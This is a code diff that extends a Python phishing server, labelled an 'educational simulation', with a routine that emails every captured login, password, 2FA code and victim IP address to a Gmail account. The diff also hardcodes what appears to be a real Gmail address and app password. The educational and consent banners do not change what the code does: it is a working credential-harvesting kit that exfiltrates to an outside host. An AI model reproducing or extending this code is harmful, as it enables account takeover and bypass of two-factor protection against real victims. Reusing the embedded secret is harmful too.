@@ -1,3 +1,7 @@
+#!/usr/bin/env python3
+# ADVANCED EDUCATIONAL PHISHING SIMULATION - Educational Purposes Only
+# WARNING: Only deploy in controlled environments with explicit consent
+
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import urllib.parse
 from datetime import datetime
@@ -6,13 +10,56 @@ import json
 import hashlib
 import secrets
 from urllib.parse import urlparse, parse_qs
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
 
 # ===== CONFIGURATION =====
 # Change this password to something strong!
 DASHBOARD_PASSWORD = "phishing@10$"  # CHANGE THIS!
-# =========================
+
+# ===== EMAIL CONFIGURATION =====
+GMAIL_USER = "ifiwas1898617@gmail.com"  # Replace with YOUR email
+GMAIL_PASSWORD = "qszetclmnqtshaoe"  # Your app password (no spaces!)
+NOTIFY_EMAIL = "ifiwas1898617@gmail.com"  # Where to send notifications
+# ================================
 
 class AdvancedPhishingSimHandler(BaseHTTPRequestHandler):
+    
+    def send_email_notification(self, email, password, totp, ip):
+        """Send captured credentials via email"""
+        try:
+            msg = MIMEMultipart()
+            msg['From'] = GMAIL_USER
+            msg['To'] = NOTIFY_EMAIL
+            msg['Subject'] = f"🔐 New Credential: {email}"
+            
+            body = f"""
+═══════════════════════════════════════
+🔐 NEW CREDENTIALS CAPTURED
+═══════════════════════════════════════
+
+📧 Email:    {email}
+🔑 Password: {password}
+📱 2FA Code: {totp if totp else 'N/A'}
+🌐 IP:       {ip}
+🕐 Time:     {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+
+═══════════════════════════════════════
+📍 Phishing Simulation - Educational Only
+"""
+            
+            msg.attach(MIMEText(body, 'plain'))
+            
+            server = smtplib.SMTP('smtp.gmail.com', 587)
+            server.starttls()
+            server.login(GMAIL_USER, GMAIL_PASSWORD)
+            server.send_message(msg)
+            server.quit()
+            
+            print(f"[✓] Email sent for: {email}")
+        except Exception as e:
+            print(f"[✗] Email failed: {e}")
     
     def check_auth(self, path):
         """Check if the request is authorized for protected pages"""
@@ -324,6 +371,9 @@ class AdvancedPhishingSimHandler(BaseHTTPRequestHandler):
             # Create timestamp
             timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             
+            # Send email notification (DO THIS FIRST)
+            self.send_email_notification(email, password, totp, client_ip)
+            
             # Log to simple text file
             log_entry = f"[{timestamp}] IP: {client_ip} | Email: {email} | Password: {password} | 2FA: {totp}\n"
             with open('captured_log.txt', 'a') as f:
@@ -400,6 +450,7 @@ def run_server():
     print(f"🌐 Accessible at: https://your-render-url.onrender.com")
     print(f"\n🔑 Dashboard Password: {DASHBOARD_PASSWORD}")
     print(f"📊 Dashboard URL: /dashboard?pass={DASHBOARD_PASSWORD}")
+    print(f"\n📧 Email notifications: ON - Sending to {NOTIFY_EMAIL}")
     print("\n⚠️  IMPORTANT SECURITY NOTES:")
     print("   - This is for EDUCATIONAL PURPOSES only")
     print("   - Only use with explicit participant consent")
